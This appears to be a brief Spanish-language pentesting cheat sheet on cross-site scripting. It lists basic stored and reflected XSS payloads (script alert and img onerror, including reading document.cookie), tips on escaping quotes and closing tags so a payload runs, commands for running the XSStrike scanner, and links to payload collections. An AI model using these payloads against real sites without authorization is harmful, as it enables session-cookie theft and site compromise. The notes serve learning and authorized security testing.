Tomar en cuenta que algunas veces vamos a tener que ver el codigo para personalizar nuestro payload porque algunas veces se tendra que romper comillas o cerrar tags del mismo codigo para que funcione nuestro payload

Tambi`en tomar ojo en el network de la misma pagina porque el payload tal vez se envia en un post o un get que no es del boton que estamos ejecutando

# Stored & Reflected XSS
```
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
```

# Reflected XSS
Tomar en cuenta que cuando el js usa innerhtml los tags <script> no funcionan porque existe una purificacion
```
<img src=x onerror=alert(document.cookie)>
```

# Automated tools
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

# Repositories
```
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[Payload-Box](https://github.com/payload-box/xss-payload-list)
```
